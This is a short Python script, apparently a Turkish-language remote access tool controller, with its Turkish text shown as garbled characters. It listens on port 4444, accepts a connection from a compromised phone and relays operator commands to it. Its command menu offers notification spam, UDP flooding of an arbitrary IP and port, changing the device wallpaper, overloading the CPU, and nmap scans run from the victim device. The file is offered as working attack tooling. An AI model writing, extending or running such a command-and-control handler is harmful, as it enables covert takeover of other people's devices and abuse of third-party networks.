
import socket
import argparse

komut_listesi = {
    'exit': 'BaÄŸlantÄ±yÄ± sonlandÄ±rÄ±r',
    'bildirim-spam "BaÅŸlÄ±k" "Ä°Ã§erik"': 'Cihaza Ã¶zel bildirim gÃ¶nderir',
    'udp-spam IP PORT MESAJ': 'Belirtilen IP ve porta UDP mesajÄ± yollar',
    'arka-plan <dosya.jpg>': 'CihazÄ±n arka planÄ±nÄ± deÄŸiÅŸtirir',
    'yÃ¼kle': 'Telefonu CPU ile meÅŸgul eder',
    'nmap IP': 'IP adresine port taramasÄ± yapar'
}

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", type=int, default=4444, help="Dinlenecek port numarasÄ±")
args = parser.parse_args()

host = "0.0.0.0"
port = args.port

s = socket.socket()
s.bind((host, port))
s.listen(1)
print(f"[+] Dinleniyor: {host}:{port}")

client, addr = s.accept()
print(f"[+] BaÄŸlandÄ±: {addr[0]}:{addr[1]}")

try:
    while True:
        komut = input("Komut >> ").strip()
        if not komut:
            continue
        if komut == "help":
            print("\n[ Komutlar ]")
            for k, v in komut_listesi.items():
                print(f"  - {k}: {v}")
            print()
            continue
        client.send(komut.encode())
        cevap = client.recv(4096).decode()
        print(cevap)
        if komut == "exit":
            break
except Exception as e:
    print(f"[X] Hata: {str(e)}")

client.close()
s.close()
